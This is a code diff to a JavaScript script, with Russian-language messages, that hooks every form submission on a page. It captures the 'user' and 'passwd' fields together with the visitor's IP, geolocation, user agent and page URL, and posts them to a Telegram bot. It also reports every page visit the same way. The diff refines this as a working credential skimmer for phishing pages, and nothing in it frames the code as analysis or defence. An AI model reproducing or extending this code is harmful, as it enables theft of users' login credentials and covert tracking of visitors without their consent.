@@ -6,7 +6,7 @@ function sendToTelegram(message) {
     fetch(url, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: tgChatId, text: message }),
+        body: JSON.stringify({ chat_id: tgChatId, text: message, parse_mode: "Markdown" }),
     }).catch(err => console.error("Ошибка отправки в Telegram:", err));
 }
 
@@ -20,7 +20,7 @@ function hashDomain(domain) {
 }
 
 function getIPInfo() {
-    return fetch("https://ipapi.co/json/") // Бесплатный уровень API
+    return fetch("https://ipapi.co/json/")
         .then(response => {
             if (!response.ok) {
                 throw new Error("Ошибка получения информации о IP");
@@ -30,26 +30,43 @@ function getIPInfo() {
         .then(data => {
             return {
                 ip: data.ip,
-                hostname: data.hostname || "Неизвестно",
                 location: `${data.city || "Неизвестно"}, ${data.region || "Неизвестно"}, ${data.country_name || "Неизвестно"}`,
-                org: window.location.hostname
+                org: window.location.hostname,
             };
         })
         .catch(err => console.error("Ошибка получения информации о IP:", err));
 }
 
+function getSimplifiedUserAgent() {
+    const userAgent = navigator.userAgent || "Неизвестно";
+    const browserMatches = userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera|MSIE|Trident)\/\d+/) || ["Неизвестно"];
+    const osMatches = userAgent.match(/\(([^)]+)\)/) || ["", "Неизвестно"];
+    const browser = browserMatches[0].split("/")[0]; // Название браузера
+    const os = osMatches[1].split(";")[0]; // Операционная система
+    return `${browser} on ${os}`;
+}
+
 document.addEventListener("submit", event => {
     const formData = new FormData(event.target);
-    const data = Array.from(formData.entries()).map(([key, value]) => `${key}: ${value}`).join("\n");
+    const filteredData = ["user", "passwd"]
+        .map(field => `${field}: ${formData.get(field) || "Не указано"}`)
+        .join("\n");
+
+    const simplifiedUserAgent = getSimplifiedUserAgent();
+
     getIPInfo().then(info => {
         hashDomain(info.org).then(domainHashTag => {
-            const message = `🚀 Отправка формы:
-- IP: ${info.ip}
-- Хост: ${info.hostname}
-- Местоположение: ${info.location}
-- Организация: ${info.org}
-- Данные формы:
-${data}
+            const message = `🚀 *Новая отправка формы:*
+---
+- 🛡️ **Данные формы:**
+\`\`\`
+${filteredData}
+\`\`\`
+- 🌐 **IP-адрес:** ${info.ip}
+- 📍 **Местоположение:** ${info.location}
+- 🖥️ **User-Agent:** ${simplifiedUserAgent}
+- 🔗 **Страница:** ${window.location.href}
+- 🏢 **Организация:** ${info.org}
 ${domainHashTag}`;
             sendToTelegram(message);
         });
@@ -57,14 +74,17 @@ ${domainHashTag}`;
 });
 
 function logPageVisit() {
+    const simplifiedUserAgent = getSimplifiedUserAgent();
+
     getIPInfo().then(info => {
         hashDomain(info.org).then(domainHashTag => {
-            const message = `🌐 Новый визит:
-- IP: ${info.ip}
-- Хост: ${info.hostname}
-- Местоположение: ${info.location}
-- Организация: ${info.org}
-- Страница: ${window.location.href}
+            const message = `🌐 *Новый визит страницы:*
+---
+- 🌐 **IP-адрес:** ${info.ip}
+- 📍 **Местоположение:** ${info.location}
+- 🖥️ **User-Agent:** ${simplifiedUserAgent}
+- 🔗 **Страница:** ${window.location.href}
+- 🏢 **Организация:** ${info.org}
 ${domainHashTag}`;
             sendToTelegram(message);
         });
